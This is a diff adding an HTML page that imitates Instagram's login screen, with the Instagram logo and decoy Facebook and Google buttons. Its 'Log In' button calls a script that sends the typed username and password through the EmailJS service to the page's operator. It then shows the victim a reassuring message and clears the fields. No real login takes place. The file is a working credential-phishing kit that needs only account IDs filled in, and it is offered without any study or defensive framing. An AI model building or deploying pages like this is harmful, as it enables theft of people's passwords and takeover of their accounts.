@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login Project</title>
+<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+<style>
+  body {
+    margin:0;
+    font-family: Arial, sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    background: linear-gradient(to bottom, #fafafa, #ebedee);
+  }
+
+  .login-container {
+    background: white;
+    width: 350px;
+    border: 1px solid #ddd;
+    border-radius: 12px;
+    padding: 40px 30px;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    animation: fadeIn 1s ease-in-out;
+    transition: transform 0.3s;
+    position: relative;
+  }
+
+  .login-container:hover { transform: translateY(-5px); }
+
+  .login-container img {
+    width: 180px;
+    margin-bottom: 20px;
+    animation: logoBounce 1s ease;
+  }
+
+  input {
+    width: 90%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    outline: none;
+    transition: all 0.3s;
+  }
+
+  input:focus {
+    border-color: #3897f0;
+    box-shadow: 0 0 8px rgba(56,151,240,0.5);
+    transform: scale(1.02);
+  }
+
+  .password-container { position: relative; }
+  .toggle-password {
+    position: absolute; right: 20px; top: 14px; cursor: pointer; font-size: 14px; color: #555; user-select: none;
+  }
+
+  button {
+    width: 95%; padding: 12px; margin-top: 15px;
+    background: #3897f0; border: none; color: #fff;
+    font-weight: bold; border-radius: 5px; cursor: pointer; transition: all 0.3s; position: relative;
+  }
+
+  button:hover { background: #2a76c7; transform: scale(1.03); }
+
+  .signup-text { margin-top: 15px; font-size: 14px; color: #888; }
+  .signup-text a { text-decoration: none; color: #3897f0; font-weight: bold; }
+
+  .forgot-password { font-size: 13px; color: #3897f0; cursor: pointer; display: block; margin: 8px 0; text-decoration: none; }
+
+  .social-login {
+    margin-top: 20px;
+    display: flex; justify-content: space-around;
+  }
+
+  .social-btn {
+    padding: 10px; width: 48%; border-radius:5px; border:none; cursor:pointer; font-weight:bold; color:white;
+  }
+
+  .facebook { background:#1877f2; }
+  .google { background:#db4437; }
+
+  .loader {
+    border: 3px solid #f3f3f3; border-top: 3px solid #3897f0;
+    border-radius: 50%; width: 18px; height: 18px;
+    animation: spin 1s linear infinite; display: inline-block; margin-left: 10px; vertical-align: middle;
+  }
+
+  .notification {
+    position: absolute; top: -35px; width: 100%; font-size: 14px;
+    color: white; padding: 8px 0; border-radius: 5px; opacity: 0; transition: opacity 0.5s;
+  }
+
+  .notification.success { background: #4CAF50; }
+  .notification.error { background: #f44336; }
+
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes logoBounce { 0% { transform: translateY(-20px); opacity: 0; } 50% { transform: translateY(5px); opacity: 1; } 100% { transform: translateY(0); } }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  @media (max-width: 400px) { .login-container { width: 90%; padding: 30px 20px; } input, button { width: 95%; } }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <div class="notification" id="notification"></div>
+  <img src="assets/instagram-logo.png" alt="Instagram Logo">
+  
+  <input type="text" id="username" placeholder="Phone number, username, or email">
+  <div class="password-container">
+    <input type="password" id="password" placeholder="Password">
+    <span class="toggle-password" onclick="togglePassword()">Show</span>
+  </div>
+  
+  <a class="forgot-password" href="#">Forgot password?</a>
+  <button id="loginBtn" onclick="sendEmail()">Log In</button>
+
+  <div class="social-login">
+    <button class="social-btn facebook">Facebook</button>
+    <button class="social-btn google">Google</button>
+  </div>
+
+  <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+</div>
+
+<script>
+  emailjs.init("YOUR_EMAILJS_USER_ID"); // Replace with your EmailJS user ID
+
+  function togglePassword() {
+    const password = document.getElementById('password');
+    const toggle = document.querySelector('.toggle-password');
+    if(password.type === 'password') { password.type = 'text'; toggle.innerText = 'Hide'; }
+    else { password.type = 'password'; toggle.innerText = 'Show'; }
+  }
+
+  function showNotification(message, type) {
+    const notif = document.getElementById('notification');
+    notif.innerText = message;
+    notif.className = `notification ${type}`;
+    notif.style.opacity = 1;
+    setTimeout(() => { notif.style.opacity = 0; }, 3000);
+  }
+
+  function sendEmail() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const loginBtn = document.getElementById('loginBtn');
+
+    if(username === "" || password === "") {
+      showNotification("Please fill in both fields!", "error");
+      return;
+    }
+
+    loginBtn.disabled = true;
+    loginBtn.innerHTML = 'Logging in <span class="loader"></span>';
+
+    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", { username, password })
+      .then(() => {
+        showNotification("Data sent safely!", "success");
+        document.getElementById('username').value = "";
+        document.getElementById('password').value = "";
+        loginBtn.disabled = false;
+        loginBtn.innerHTML = "Log In";
+      }, (err) => {
+        showNotification("Failed to send data!", "error");
+        loginBtn.disabled = false;
+        loginBtn.innerHTML = "Log In";
+      });
+  }
+</script>
+
+</body>
+</html>
